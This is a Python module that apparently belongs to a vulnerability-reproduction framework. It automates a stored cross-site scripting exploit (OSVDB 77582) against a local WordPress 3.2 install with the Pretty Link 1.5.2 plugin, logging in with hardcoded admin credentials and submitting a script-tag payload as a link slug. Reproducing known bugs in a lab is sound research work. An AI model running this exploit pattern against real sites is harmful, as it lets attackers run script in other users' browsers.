import framework                                                                                                                                                                   
import time                                                                                                                                           
                                                                                                                                                                                   
class Exploit (framework.Exploit):                                                                                                                                                 
                                                                                                                                                                                   
    attributes = {'Name' : "OSVDB_77582",                                                                                                                                          
                  'Description' : "Creates a post containing a XSS payload.",                                                                                                      
                  'References' : [['OSVDB','77582'],['http://www.osvdb.org/show/osvdb/77582']],                                                                                    
                  'Target' : "Wordpress 3.2",                                                                                                                                      
                  'TargetLicense' : '',                                                                                                                                            
                  'Type' : "XSS",                                                                                                                                                  
                  'VulWikiPage' : "http://seamster.cs.umd.edu/vulwiki/index.php/OSVDB-77582",                                                                                      
                  'Plugin' : "Pretty Link 1.5.2"                                                                                              
                  }                                                                                                                                                                
                                                                                                                                                                                   
    def __init__(self, visible=False):                                                                                                                                             
        framework.Exploit.__init__(self, visible)                                                                                                                                  
        return                                                                                                                                                                     
                                                                                                                                                                                   
    def exploit(self):                                                                                                                                                             
                                                                                                                                                                                   
        payload = "<script>prompt(\"Attack!!\")</script>"                                                                                                                                                                                                                                                                                                     
                                                                                                                                                                                   
        driver = self.create_selenium_driver()                                                                                                                                     
                                                                                                                                                                                   
        driver.get("http://localhost/wordpress")                                                                                                                                   
        self.logger.info("Page opened successfully: %s", driver.title)                                                                                                             
        self.logger.info("uploading payload: %s", payload) 

        driver.get("http://localhost/wordpress/wp-login.php")                                                                                                                        
                                                                                                                                                                                                                                                                                           
        driver.find_element_by_id("user_login").clear()
        driver.find_element_by_id("user_login").send_keys(" wpadmin")                                                                                            
        driver.find_element_by_id("user_pass").clear()   
        driver.find_element_by_id("user_pass").send_keys("wpadminpw21")
        driver.find_element_by_id("wp-submit").send_keys("\n")
        driver.get("http://127.0.0.1/wordpress/wp-admin/options-permalink.php")
        driver.find_element_by_name("permalink_structure").clear()
        driver.find_element_by_name("permalink_structure").send_keys("/%year%/%monthnum%/%day%/%postname%/")
        driver.find_element_by_id("submit").click()
                                                                                                                        
        driver.get("http://127.0.0.1/wordpress/admin.php?page=pretty-link/prli-links.php")
        driver.get("http://127.0.0.1/wordpress/wp-admin/admin.php?page=pretty-link/prli-add-link.php")
        driver.find_element_by_name("url").clear()
        driver.find_element_by_name("url").send_keys("http://127.0.0.1/wordpress/wp-admin")
        driver.find_element_by_name("slug").clear()
        driver.find_element_by_name("slug").send_keys("<script>alert(\"Attack\")</script>")
        driver.find_element_by_name("Submit").click()                                                                                                                                                                                                                                                                                                                                              
                                                                                                                         
        time.sleep(10)                                                                                                                                                             
        driver.cleanup()                                                                                                                                                           
        return                
